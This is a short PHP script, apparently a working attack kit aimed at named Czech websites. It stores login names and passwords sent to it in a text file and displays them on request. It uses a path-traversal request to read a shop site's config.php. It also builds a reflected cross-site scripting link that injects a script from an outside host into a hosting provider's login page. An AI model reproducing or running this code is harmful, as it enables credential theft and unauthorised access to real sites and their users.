<?php
$f = 'wt100fun.txt';
$a = (isset($_GET['a']) ? $_GET['a'] : '');
switch ($a) {
    case 'w':
        $l = (isset($_GET['l']) ? $_GET['l'] : '');
        $p = (isset($_GET['p']) ? $_GET['p'] : '');
        file_put_contents($f, "L: {$l}\nP: {$p}\n--\n", FILE_APPEND | LOCK_EX);
        break;
    case 'r':
        header('Cache-Control: no-cache, must-revalidate');
        header('Expires: Sat, 26 Jul 1997 05:00:00 GMT');
        header('Content-type: text/plain');
        if (file_exists($f)) {
            echo file_get_contents($f);
        }
        break;
    case 's':
        highlight_string(file_get_contents('http://www.coop.cz/showImage.php?fileName=../../config.php'));
        break;
    default:
        $x = '"><script src="http://exploited.cz/webtop100/xss.js"></script><span class="';
        echo '<ul><li><a href="http://wcc.webcloud.cz/prihlaseni.html?email=' . urlencode($x) . '">jdi na webcloud</a></li><li><a href="?a=r">ukaž údaje</a></li></ul><hr>';
        echo '<ul><li><a href="?a=s">zdrojový soubor</li><li><a href="http://mysql.active24.cz/admin2/">admin</a></li><li><a href="http://mysql.active24.cz/admin2/?pma_username=foo&pma_password=bar">admin login</a></li><li><a href="http://www.coop.cz/hp/">coop</a></li></ul>';
        break;
}
